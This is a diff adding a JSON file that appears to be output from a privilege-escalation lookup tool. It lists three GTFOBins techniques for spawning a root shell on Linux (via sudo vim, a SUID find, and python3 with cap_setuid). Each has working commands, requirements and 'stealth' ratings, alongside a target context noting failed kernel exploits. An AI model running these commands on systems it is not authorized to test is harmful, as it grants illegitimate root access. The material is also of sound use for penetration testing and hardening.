@@ -1,0 +1,50 @@
+{
+    "results": [
+        {
+            "source": "GTFOBins",
+            "technique_id": "gtfobins:vim:sudo",
+            "description": "vim can be used to spawn a shell with sudo privileges",
+            "command": "sudo vim -c ':!/bin/bash'",
+            "requirements": [
+                "sudo NOPASSWD vim"
+            ],
+            "risk": "low",
+            "stealth": "high"
+        },
+        {
+            "source": "GTFOBins",
+            "technique_id": "gtfobins:find:suid",
+            "description": "find with SUID can execute commands as root",
+            "command": "./find . -exec /bin/bash -p \\; -quit",
+            "requirements": [
+                "SUID bit on find"
+            ],
+            "risk": "low",
+            "stealth": "high"
+        },
+        {
+            "source": "GTFOBins",
+            "technique_id": "gtfobins:python:capabilities",
+            "description": "Python with cap_setuid capability can set UID to root",
+            "command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+            "requirements": [
+                "cap_setuid capability"
+            ],
+            "risk": "low",
+            "stealth": "high"
+        }
+    ],
+    "query_context": {
+        "target_os": "linux",
+        "privilege_level": "user",
+        "available_tools": [
+            "vim",
+            "find",
+            "python3"
+        ],
+        "failed_techniques": [
+            "kernel_exploit",
+            "dirty_pipe"
+        ]
+    }
+}
